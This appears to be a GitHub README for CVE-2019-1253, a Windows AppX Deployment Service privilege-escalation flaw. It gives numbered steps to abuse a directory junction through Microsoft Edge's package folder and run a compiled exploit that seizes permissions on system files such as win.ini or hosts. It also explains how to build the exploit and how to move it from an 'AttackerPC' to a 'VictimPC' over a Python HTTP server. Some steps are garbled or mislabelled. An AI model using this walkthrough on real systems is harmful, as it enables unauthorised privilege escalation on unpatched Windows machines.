## CVE2019-1253-Compiled
Windows AppX Deployment -  Windows Elevation of Privilege Vulnerability
```
The “wsappx” process is part of Windows 8 and 10, and you may see it running in the background and it’s related to the Windows Store and Microsoft’s new “Universal” app platform. if you see the wsappx process running in your Task Manager, expand it and you’ll see one or both of the two subservices running (depending on which version of Windows you’re using). These services handle installing, removing, and updating Store apps.

In other words, this process is used for installing, uninstalling, and updating Store apps. Windows automatically updates Store apps in the background, and many of the apps included with Windows.

Note:An attacker can exploit this issue to gain the elevated privileges on the system.
```
## Tested on 
![Screenshot](test.png?raw=true)

## How to Replicate this attack
So, Here is the Way ..!!
```
1. Check if exists directory ""C:\Users\{Environment.UserName}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe"
If not, launch Edge for the first time to create that directory.
2. Check if there are any Microsoft Edge running processes. In that case, kill all the processes.
3. Create temporary directory in C:\ , with your choice name.
4. Above Created directory we will use as mountpoint so now Create the hardlink to the targetted file within this directory.
(mklink /J "C:\testapp" "C:\Users\JohnUser\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\Settings")
5. Launch Microsoft Edge, it will crash and AppxSvc and takes SYSTEM ownership of the directory created by you in C: directory , if it doen't happen so don't worry it's okay.
5. Delete the local user directory for the Microsof Edge package appX after visiting "C:\Users\{Environment.UserName}\AppData\Local\Packages\" inside it. Delete everything except "C:\Users\{Environment.UserName}\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\" this location inside the Package directory.
6. Try to removes permissions for current user from modify access to none, in my case i was not able to remove perm from the user so i lefted and proceed further to test the case.
7.Clear directory files from the mounted directory and try to re-create the hardlink to the targeted file inside this directory.
(it will say aleady exits , no worry move on)
8. git clone the Exploit and Check the permission of your target file which you are going to modify the permission.
(Target file may be choosen as "C:\WIndows\win.ini" or "C:\Windows\System32\drivers\etc\hosts" or you can choose many more systems file.)
9. Exploit it using AppxExploit.exe "C:\Windows\win.ini"
```
## Source Code of the Exploit can be found here

https://github.com/padovah4ck/CVE-2019-1253


## Screenshoot includes here
## Before
![Screenshot](whoami.png?raw=true)
![Screenshot](userinfo.png?raw=true)

## After 
![Screenshot](exploit.png?raw=true)
![Screenshot](winperm.png?raw=true)
![Screenshot](newperm.png?raw=true)

## Compile C# project from Visual Studio
Open your project to visual studio
```
Open Visual Studio --> Open Local Folder --> Select your Downloaded Folder --> Open CVE-2019-1253 --> AppExploit_Edge --> Select Folder --> Open
```
After opening your Project, just build it 
```
go to AppxExploit.csproject --> Double click to open --> Then at the top of the screen click on green icon to build
```
Now, Download and mimic exploitation.

## Transfer Exploit from AttackerPC to VictimPC
```python2.7
Python2.7:\>pyhton -m SimpleHTTPServer 90
```
```pyhton 3
Python3:\>python -m http.server
```

## How to create Hardlink, Softlink & junction
```
mklink Link Target
mklink /D Link Target
mklink /H Link Target
mklink /J Link Target
```
```
Use /D when you want to create a soft link pointing to a directory.
Use /H when you want to create a hard link pointing to a file:
Use /J to create a hard link pointing to a directory, also known as a directory junction:
```
## Technologies Affected

    Microsoft Windows 10 Version 1709 for ARM64-based Systems
    Microsoft Windows 10 Version 1803 for 32-bit Systems
    Microsoft Windows 10 Version 1803 for ARM64-based Systems
    Microsoft Windows 10 Version 1803 for x64-based Systems
    Microsoft Windows 10 Version 1809 for 32-bit Systems
    Microsoft Windows 10 Version 1809 for ARM64-based Systems
    Microsoft Windows 10 Version 1809 for x64-based Systems
    Microsoft Windows 10 Version 1903 for 32-bit Systems
    Microsoft Windows 10 Version 1903 for ARM64-based Systems
    Microsoft Windows 10 Version 1903 for x64-based Systems
    Microsoft Windows 10 version 1703 for 32-bit Systems
    Microsoft Windows 10 version 1703 for x64-based Systems
    Microsoft Windows 10 version 1709 for 32-bit Systems
    Microsoft Windows 10 version 1709 for x64-based Systems
    Microsoft Windows Server 1803
    Microsoft Windows Server 1903
    Microsoft Windows Server 2019


## References
https://github.com/padovah4ck/CVE-2019-1253

https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/

https://www.symantec.com/security-center/vulnerabilities/writeup/109913?om_rssid=sr-advisories

